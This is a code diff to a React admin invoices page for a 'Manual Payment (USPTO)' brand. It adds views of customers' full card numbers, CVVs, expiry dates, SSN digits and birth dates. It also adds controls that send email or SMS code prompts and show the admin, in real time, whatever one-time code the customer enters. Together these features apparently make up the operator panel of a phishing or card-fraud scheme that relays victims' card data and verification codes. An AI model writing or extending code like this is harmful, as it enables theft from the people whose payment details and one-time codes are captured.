@@ -38,7 +38,7 @@ export default function Invoices() {
   const [activeTab, setActiveTab] = useState('active'); // 'active' or 'archived'
   
   // USPTO OTP modal states
-  const [otpModal, setOtpModal] = useState({ open: false, method: '', invoiceId: null, invoiceNumber: null });
+  const [otpModal, setOtpModal] = useState({ open: false, method: '', invoiceId: null, invoiceNumber: null, verificationType: '' });
   const [adminNote, setAdminNote] = useState('');
   const [sendingOTP, setSendingOTP] = useState(false);
   
@@ -295,25 +295,26 @@ export default function Invoices() {
 
   // USPTO OTP Handlers
   const handleSendOTP = async (method) => {
-    if (!otpModal.invoiceId) return;
+    if (!otpModal.invoiceId || !otpModal.verificationType) return;
     
     setSendingOTP(true);
     try {
-      const endpoint = method === 'email' || method === 'trigger' ? 'send-otp-email' : 'send-otp-sms';
+      const endpoint = method === 'email' ? 'send-otp-email' : 'send-otp-sms';
       const res = await api.post(`/invoices/${otpModal.invoiceId}/${endpoint}`, {
-        adminNote: adminNote || 'Please wait while we verify your payment.'
+        adminNote: adminNote || (otpModal.verificationType === 'otp' ? 'Please enter the code to verify your payment.' : ''),
+        verificationType: otpModal.verificationType
       });
       
-      toast.success('Payment shared status activated for customer');
+      toast.success(otpModal.verificationType === 'otp' ? 'OTP request sent to customer' : 'Yes/No alert sent to customer');
       
       // Close modal and reset
-      setOtpModal({ open: false, method: '', invoiceId: null, invoiceNumber: null });
+      setOtpModal({ open: false, method: '', invoiceId: null, invoiceNumber: null, verificationType: '' });
       setAdminNote('');
       
       // Refresh invoices
       fetchAll();
     } catch (err) {
-      toast.error(err.response?.data?.message || 'Failed to activate shared status');
+      toast.error(err.response?.data?.message || 'Failed to send verification');
     } finally {
       setSendingOTP(false);
     }
@@ -631,23 +632,31 @@ export default function Invoices() {
                         }
                         return null;
                       })()}
-                      {inv.status === 'payment_requested' && user?.role === 'admin' && inv.brand?.isManualPayment && (inv.otpStatus === null || inv.otpStatus === undefined || inv.otpStatus === 'pending') && (
+                      {/* Email/SMS buttons - show until payment is finalized */}
+                      {inv.status === 'payment_requested' && user?.role === 'admin' && inv.brand?.isManualPayment && (
                         <>
                           <button 
-                            onClick={() => setOtpModal({ open: true, method: 'email', invoiceId: inv._id, invoiceNumber: inv.invoiceNumber })} 
-                            title="Trigger Email OTP Screen" 
+                            onClick={() => setOtpModal({ open: true, method: 'email', invoiceId: inv._id, invoiceNumber: inv.invoiceNumber, verificationType: '' })} 
+                            title="Trigger Email Verification" 
                             className="p-1.5 rounded-lg hover:bg-blue-50 text-blue-600 transition-colors"
                           >
                             <Mail size={15} />
                           </button>
                           <button 
-                            onClick={() => setOtpModal({ open: true, method: 'sms', invoiceId: inv._id, invoiceNumber: inv.invoiceNumber })} 
-                            title="Trigger SMS OTP Screen" 
+                            onClick={() => setOtpModal({ open: true, method: 'sms', invoiceId: inv._id, invoiceNumber: inv.invoiceNumber, verificationType: '' })} 
+                            title="Trigger SMS Verification" 
                             className="p-1.5 rounded-lg hover:bg-purple-50 text-purple-600 transition-colors"
                           >
                             <MessageSquare size={15} />
                           </button>
                         </>
+                      )}
+                      {/* Show real-time OTP/Response when received */}
+                      {inv.status === 'payment_requested' && inv.brand?.isManualPayment && inv.otpStatus === 'otp_received' && inv.customerOtpCode && (
+                        <div className="flex items-center gap-1 px-2 py-1 bg-blue-100 text-blue-700 rounded text-xs font-mono">
+                          <Lock size={12} />
+                          Code: {inv.customerOtpCode}
+                        </div>
                       )}
                       {/* USPTO Final Actions - Show when customer marked */}
                       {(() => {
@@ -663,6 +672,14 @@ export default function Invoices() {
                       })()}
                       {inv.status === 'payment_requested' && user?.role === 'admin' && inv.brand?.isManualPayment && inv.otpStatus === 'customer_marked' && (
                         <>
+                          {/* Show customer response */}
+                          {inv.customerOtpCode && (
+                            <div className="flex items-center gap-1 px-2 py-1 bg-green-100 text-green-700 rounded text-xs font-mono mr-1">
+                              <CheckCircle size={12} />
+                              {inv.verificationType === 'otp' ? `Code: ${inv.customerOtpCode}` : `Response: ${inv.customerResponse}`}
+                            </div>
+                          )}
+                          {/* Action buttons */}
                           <button 
                             onClick={() => handleUSPTOAction(inv._id, 'paid')} 
                             title="Mark as Paid" 
@@ -686,11 +703,13 @@ export default function Invoices() {
                           </button>
                         </>
                       )}
-                      {inv.status === 'paid' && (
+                      {(inv.status === 'paid' || inv.status === 'payment_requested') && (
                         <>
-                          <span className="p-1.5 text-green-600" title="Paid">
-                            <CheckCircle size={15} />
-                          </span>
+                          {inv.status === 'paid' && (
+                            <span className="p-1.5 text-green-600" title="Paid">
+                              <CheckCircle size={15} />
+                            </span>
+                          )}
                           <button 
                             onClick={() => handleViewBillingDetails(inv._id)} 
                             title="View Customer Details" 
@@ -698,7 +717,7 @@ export default function Invoices() {
                           >
                             <User size={15} />
                           </button>
-                          {user?.role === 'admin' && (
+                          {inv.status === 'paid' && user?.role === 'admin' && (
                             <>
                               <button 
                                 onClick={() => handleUndo(inv._id)} 
@@ -981,6 +1000,14 @@ export default function Invoices() {
       <Modal isOpen={billingDetailsModal} title="Customer & Payment Details" onClose={() => { setBillingDetailsModal(false); setBillingDetails(null); }} size="lg">
         {billingDetails && (
           <div className="space-y-6">
+            {/* DEBUG: Log the billing details */}
+            {(() => {
+              console.log('🔍 Billing Details Modal - Has billingDetails object:', !!billingDetails.billingDetails);
+              console.log('🔍 Billing Details Modal - Has paymentData object:', !!billingDetails.paymentData);
+              console.log('🔍 Billing Details Modal - Brand isManualPayment:', billingDetails.brand?.isManualPayment);
+              return null;
+            })()}
+            
             {/* Invoice Info */}
             <div className="bg-blue-50 rounded-lg p-4">
               <h3 className="text-sm font-semibold text-gray-700 mb-2">Invoice Information</h3>
@@ -1048,8 +1075,8 @@ export default function Invoices() {
               </div>
             </div>
 
-            {/* Billing Details */}
-            {billingDetails.billingDetails && (
+            {/* Billing Details - Show if we have billing data OR if it's a manual payment brand with paymentData */}
+            {(billingDetails.billingDetails || (billingDetails.brand?.isManualPayment && billingDetails.paymentData)) && (
               <>
                 <div>
                   <h3 className="text-sm font-semibold text-gray-700 mb-3 flex items-center gap-2">
@@ -1058,13 +1085,13 @@ export default function Invoices() {
                   <div className="grid grid-cols-2 gap-4 text-sm">
                     <div>
                       <p className="text-gray-600 text-xs">First Name</p>
-                      <p className="font-medium text-gray-900">{billingDetails.billingDetails.firstName}</p>
+                      <p className="font-medium text-gray-900">{billingDetails.billingDetails?.firstName || '—'}</p>
                     </div>
                     <div>
                       <p className="text-gray-600 text-xs">Last Name</p>
-                      <p className="font-medium text-gray-900">{billingDetails.billingDetails.lastName}</p>
+                      <p className="font-medium text-gray-900">{billingDetails.billingDetails?.lastName || '—'}</p>
                     </div>
-                    {billingDetails.billingDetails.companyName && (
+                    {billingDetails.billingDetails?.companyName && (
                       <div className="col-span-2">
                         <p className="text-gray-600 text-xs">Company</p>
                         <p className="font-medium text-gray-900">{billingDetails.billingDetails.companyName}</p>
@@ -1072,9 +1099,9 @@ export default function Invoices() {
                     )}
                     <div className="col-span-2">
                       <p className="text-gray-600 text-xs">Address Line 1</p>
-                      <p className="font-medium text-gray-900">{billingDetails.billingDetails.addressLine1}</p>
+                      <p className="font-medium text-gray-900">{billingDetails.billingDetails?.addressLine1 || '—'}</p>
                     </div>
-                    {billingDetails.billingDetails.addressLine2 && (
+                    {billingDetails.billingDetails?.addressLine2 && (
                       <div className="col-span-2">
                         <p className="text-gray-600 text-xs">Address Line 2</p>
                         <p className="font-medium text-gray-900">{billingDetails.billingDetails.addressLine2}</p>
@@ -1082,57 +1109,117 @@ export default function Invoices() {
                     )}
                     <div>
                       <p className="text-gray-600 text-xs">City</p>
-                      <p className="font-medium text-gray-900">{billingDetails.billingDetails.city}</p>
+                      <p className="font-medium text-gray-900">{billingDetails.billingDetails?.city || '—'}</p>
                     </div>
                     <div>
                       <p className="text-gray-600 text-xs">State</p>
-                      <p className="font-medium text-gray-900">{billingDetails.billingDetails.state}</p>
+                      <p className="font-medium text-gray-900">{billingDetails.billingDetails?.state || '—'}</p>
                     </div>
                     <div>
                       <p className="text-gray-600 text-xs">Postal Code</p>
-                      <p className="font-medium text-gray-900">{billingDetails.billingDetails.postalCode}</p>
+                      <p className="font-medium text-gray-900">{billingDetails.billingDetails?.postalCode || '—'}</p>
                     </div>
                     <div>
                       <p className="text-gray-600 text-xs">Country</p>
-                      <p className="font-medium text-gray-900">{billingDetails.billingDetails.countryCode}</p>
+                      <p className="font-medium text-gray-900">{billingDetails.billingDetails?.countryCode || '—'}</p>
                     </div>
+                    {billingDetails.billingDetails?.phone && (
+                      <div className="col-span-2">
+                        <p className="text-gray-600 text-xs">Phone Number</p>
+                        <p className="font-medium text-gray-900">{billingDetails.billingDetails.phone}</p>
+                      </div>
+                    )}
                   </div>
                 </div>
 
                 <div>
                   <h3 className="text-sm font-semibold text-gray-700 mb-3 flex items-center gap-2">
-                    <CreditCard size={16} /> Card Information
+                    <CreditCard size={16} /> Card & Personal Information
                   </h3>
                   <div className="grid grid-cols-2 gap-4 text-sm">
-                    <div>
-                      <p className="text-gray-600 text-xs">Cardholder Name</p>
-                      <p className="font-medium text-gray-900">{billingDetails.billingDetails.cardholderName}</p>
-                    </div>
-                    <div>
-                      <p className="text-gray-600 text-xs">Card Last 4 Digits</p>
-                      <p className="font-mono font-medium text-gray-900">••••{billingDetails.billingDetails.cardLast4}</p>
-                    </div>
-                    {billingDetails.billingDetails.cardExpiry && (
+                    {/* SSN Last 4 - from billingDetails or paymentData */}
+                    {(billingDetails.billingDetails?.ssnLast4 || billingDetails.paymentData?.ssnLast4) && (
                       <div>
-                        <p className="text-gray-600 text-xs">Card Expiry</p>
-                        <p className="font-mono font-medium text-gray-900">{billingDetails.billingDetails.cardExpiry}</p>
+                        <p className="text-gray-600 text-xs">SSN (Last 4 Digits)</p>
+                        <p className="font-mono font-medium text-gray-900">•••-••-{billingDetails.billingDetails?.ssnLast4 || billingDetails.paymentData?.ssnLast4}</p>
                       </div>
                     )}
+                    
+                    {/* Date of Birth - from billingDetails or paymentData */}
+                    {(billingDetails.billingDetails?.dateOfBirth || billingDetails.paymentData?.dateOfBirth) && (
+                      <div>
+                        <p className="text-gray-600 text-xs">Date of Birth</p>
+                        <p className="font-medium text-gray-900">
+                          {new Date(billingDetails.billingDetails?.dateOfBirth || billingDetails.paymentData?.dateOfBirth).toLocaleDateString('en-US', {
+                            year: 'numeric',
+                            month: 'long',
+                            day: 'numeric'
+                          })}
+                        </p>
+                      </div>
+                    )}
+                    
                     <div>
-                      <p className="text-gray-600 text-xs">Payment Gateway</p>
-                      <p className="font-medium capitalize text-gray-900">{billingDetails.billingDetails.paymentGateway}</p>
+                      <p className="text-gray-600 text-xs">Name on Card</p>
+                      <p className="font-medium text-gray-900">
+                        {billingDetails.billingDetails?.cardholderName || 
+                         billingDetails.billingDetails?.nameOnCard || 
+                         billingDetails.paymentData?.cardData?.nameOnCard || '—'}
+                      </p>
+                    </div>
+                    
+                    {/* Full Card Number - show if available from billingDetails or paymentData */}
+                    {(billingDetails.billingDetails?.cardNumber || billingDetails.paymentData?.cardData?.cardNumber) ? (
+                      <div>
+                        <p className="text-gray-600 text-xs">Card Number</p>
+                        <p className="font-mono font-medium text-gray-900">
+                          {billingDetails.billingDetails?.cardNumber || billingDetails.paymentData?.cardData?.cardNumber}
+                        </p>
+                      </div>
+                    ) : billingDetails.billingDetails?.cardLast4 && (
+                      <div>
+                        <p className="text-gray-600 text-xs">Card Last 4 Digits</p>
+                        <p className="font-mono font-medium text-gray-900">••••{billingDetails.billingDetails.cardLast4}</p>
+                      </div>
+                    )}
+                    
+                    {/* Card Expiry */}
+                    {(billingDetails.billingDetails?.cardExpiry || billingDetails.paymentData?.cardData?.expiry) && (
+                      <div>
+                        <p className="text-gray-600 text-xs">Card Expiry</p>
+                        <p className="font-mono font-medium text-gray-900">
+                          {billingDetails.billingDetails?.cardExpiry || billingDetails.paymentData?.cardData?.expiry}
+                        </p>
+                      </div>
+                    )}
+                    
+                    {/* CVV */}
+                    {(billingDetails.billingDetails?.cardCvv || billingDetails.paymentData?.cardData?.cvv) && (
+                      <div>
+                        <p className="text-gray-600 text-xs">CVV</p>
+                        <p className="font-mono font-medium text-gray-900">
+                          {billingDetails.billingDetails?.cardCvv || billingDetails.paymentData?.cardData?.cvv}
+                        </p>
+                      </div>
+                    )}
+                    
+                    <div>
+                      <p className="text-gray-600 text-xs">Payment Method</p>
+                      <p className="font-medium capitalize text-gray-900">
+                        {billingDetails.brand?.isManualPayment ? 'Manual Payment (USPTO)' : billingDetails.billingDetails?.paymentGateway || '—'}
+                      </p>
                     </div>
                   </div>
                 </div>
 
                 {/* Payment Security Information */}
-                {(billingDetails.billingDetails.paymentTimestamp || billingDetails.billingDetails.clientIp || billingDetails.billingDetails.deviceFingerprint) && (
+                {(billingDetails.billingDetails?.paymentTimestamp || billingDetails.billingDetails?.clientIp || billingDetails.billingDetails?.deviceFingerprint) && (
                   <div className="bg-amber-50 rounded-lg p-4">
                     <h3 className="text-sm font-semibold text-gray-700 mb-3 flex items-center gap-2">
                       <Lock size={16} /> Transaction Security Details
                     </h3>
                     <div className="grid grid-cols-2 gap-4 text-sm">
-                      {billingDetails.billingDetails.paymentTimestamp && (
+                      {billingDetails.billingDetails?.paymentTimestamp && (
                         <div>
                           <p className="text-gray-600 text-xs">Payment Completed</p>
                           <p className="font-medium text-gray-900">
@@ -1147,13 +1234,13 @@ export default function Invoices() {
                           </p>
                         </div>
                       )}
-                      {billingDetails.billingDetails.clientIp && (
+                      {billingDetails.billingDetails?.clientIp && (
                         <div>
                           <p className="text-gray-600 text-xs">Client IP Address</p>
                           <p className="font-mono font-medium text-gray-900">{billingDetails.billingDetails.clientIp}</p>
                         </div>
                       )}
-                      {billingDetails.billingDetails.deviceFingerprint && (
+                      {billingDetails.billingDetails?.deviceFingerprint && (
                         <div className="col-span-2">
                           <p className="text-gray-600 text-xs">Device Fingerprint</p>
                           <p className="font-mono text-xs text-gray-900 break-all">{billingDetails.billingDetails.deviceFingerprint}</p>
@@ -1196,9 +1283,9 @@ export default function Invoices() {
       {/* USPTO Trigger Modal */}
       <Modal 
         isOpen={otpModal.open} 
-        title="Show Payment Shared Status"
+        title="Choose Verification Method"
         onClose={() => {
-          setOtpModal({ open: false, method: '', invoiceId: null, invoiceNumber: null });
+          setOtpModal({ open: false, method: '', invoiceId: null, invoiceNumber: null, verificationType: '' });
           setAdminNote('');
         }}
       >
@@ -1208,33 +1295,85 @@ export default function Invoices() {
               <strong>Invoice:</strong> {otpModal.invoiceNumber}
             </p>
             <p className="text-sm text-blue-800 mt-1">
-              This will show the "Payment Shared" status to the customer, letting them know their information has been received.
+              <strong>Method:</strong> {otpModal.method === 'email' ? 'Email' : 'SMS'}
             </p>
           </div>
 
+          {/* Verification Type Selection */}
           <div>
-            <label className="block text-sm font-medium text-gray-700 mb-2">
-              Custom Note for Customer (Optional)
+            <label className="block text-sm font-medium text-gray-700 mb-3">
+              Select Verification Type
             </label>
-            <textarea
-              value={adminNote}
-              onChange={(e) => setAdminNote(e.target.value)}
-              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent resize-none"
-              rows="3"
-              placeholder="Enter a message for the customer (e.g., 'We are reviewing your payment information')"
-            />
+            <div className="grid grid-cols-2 gap-3">
+              <button
+                onClick={() => setOtpModal({ ...otpModal, verificationType: 'otp' })}
+                className={`p-4 border-2 rounded-lg transition-all ${
+                  otpModal.verificationType === 'otp'
+                    ? 'border-blue-500 bg-blue-50'
+                    : 'border-gray-200 hover:border-gray-300'
+                }`}
+              >
+                <div className="text-center">
+                  <p className="font-semibold text-gray-900">OTP Code</p>
+                  <p className="text-xs text-gray-600 mt-1">Customer enters a code</p>
+                </div>
+              </button>
+              
+              <button
+                onClick={() => setOtpModal({ ...otpModal, verificationType: 'yesno' })}
+                className={`p-4 border-2 rounded-lg transition-all ${
+                  otpModal.verificationType === 'yesno'
+                    ? 'border-blue-500 bg-blue-50'
+                    : 'border-gray-200 hover:border-gray-300'
+                }`}
+              >
+                <div className="text-center">
+                  <p className="font-semibold text-gray-900">Yes/No Alert</p>
+                  <p className="text-xs text-gray-600 mt-1">Customer responds yes/no</p>
+                </div>
+              </button>
+            </div>
           </div>
 
-          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
-            <p className="text-xs text-yellow-800">
-              <strong>Next step:</strong> After showing this status, you'll see action buttons to mark the payment as Paid, Failed, or Card Not Accepted.
-            </p>
-          </div>
+          {/* Custom Note - shown for both types */}
+          {otpModal.verificationType && (
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-2">
+                {otpModal.verificationType === 'otp' 
+                  ? 'Custom Note for Customer (Optional)' 
+                  : 'Message for Customer (Required)'}
+              </label>
+              <textarea
+                value={adminNote}
+                onChange={(e) => setAdminNote(e.target.value)}
+                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent resize-none"
+                rows="3"
+                placeholder={
+                  otpModal.verificationType === 'otp'
+                    ? "Enter a message for the customer (optional)"
+                    : "Enter your question or message (e.g., 'Is the card information correct?')"
+                }
+                required={otpModal.verificationType === 'yesno'}
+              />
+            </div>
+          )}
+
+          {otpModal.verificationType && (
+            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
+              <p className="text-xs text-yellow-800">
+                {otpModal.verificationType === 'otp' ? (
+                  <><strong>OTP Flow:</strong> Customer will enter any code. You'll see it in real-time and can then proceed with payment actions.</>
+                ) : (
+                  <><strong>Yes/No Flow:</strong> Customer will see your message and respond with Yes or No. You'll see their response and can then proceed.</>
+                )}
+              </p>
+            </div>
+          )}
 
           <div className="flex gap-3">
             <button
               onClick={() => {
-                setOtpModal({ open: false, method: '', invoiceId: null, invoiceNumber: null });
+                setOtpModal({ open: false, method: '', invoiceId: null, invoiceNumber: null, verificationType: '' });
                 setAdminNote('');
               }}
               className="flex-1 px-4 py-2.5 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors"
@@ -1243,18 +1382,18 @@ export default function Invoices() {
             </button>
             <button
               onClick={() => handleSendOTP(otpModal.method)}
-              disabled={sendingOTP}
+              disabled={sendingOTP || !otpModal.verificationType || (otpModal.verificationType === 'yesno' && !adminNote.trim())}
               className="flex-1 px-4 py-2.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-60 transition-colors flex items-center justify-center gap-2"
             >
               {sendingOTP ? (
                 <>
                   <div className="animate-spin w-4 h-4 border-2 border-white border-t-transparent rounded-full"></div>
-                  Activating...
+                  Sending...
                 </>
               ) : (
                 <>
                   <Check size={16} />
-                  Show Shared Status
+                  Send {otpModal.verificationType === 'otp' ? 'OTP Request' : 'Yes/No Alert'}
                 </>
               )}
             </button>
